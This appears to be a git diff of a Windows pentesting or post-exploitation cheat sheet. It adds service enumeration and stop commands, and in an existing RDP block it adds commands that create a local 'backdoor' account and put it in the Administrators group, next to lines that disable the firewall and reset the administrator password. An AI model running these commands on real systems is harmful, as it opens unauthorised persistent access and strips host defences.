@@ -8,6 +8,40 @@ C> whoami /groups
 C> whoami /priv
 c>whoami /fqdn #domain
 
+
+#change password 
+PSC> Set-LocalUser -Name "Username" -Password (ConvertTo-SecureString -AsPlainText "NewPassword" -Force)
+
+#start and stop services
+net stop <service_name>
+net start <servcice_name>
+
+sc stop <servcice_name>
+sc start <servcice_name>
+
+Start-Service -Name "ServiceName"
+Stop-Service -Name "KiteService"
+
+tasklist /svc | findstr "KiteService"
+taskkill /f /pid [PID]
+
+wmic service where "name='KiteService'" call stopservice
+#check services
+
+sc qc 
+sc qc <servcice_name>
+net start | findstr "KiteService"
+tasklist /svc | findstr "svchost"
+wmic service get name,state,startmode
+wmic service where "state='running'" get name,state,startmode
+Get-Service
+Get-Service -Name "KiteService"
+Get-WmiObject Win32_Service -Filter "Name='KiteService'"\
+
+
+#check service priv
+PSC>Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select Name, State, StartMode, StartName, PathName
+
 #Folder Path Listing
 
 tree /f /a <File>
@@ -89,12 +123,11 @@ net share public=c:\users\public  /Grant:Everyone,FULL
 
 ```sh
 
-# 1.disable Firewall 
+# 1.enable rdp
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 # 2. Disable Firewall
 netsh advfirewall set allprofiles state off
-
 
 
 # 3. Set RDP Port (optional)
@@ -102,6 +135,12 @@ reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-T
 
 # 4. Change Admin Password
 net user administrator "password123"
+
+# add user account
+net user  backdoor password123 /add
+
+# add backdoor to admin group 
+net localgroup Administrators backdoor /add
 
 # 5. Start RDP Services
 net start TermService
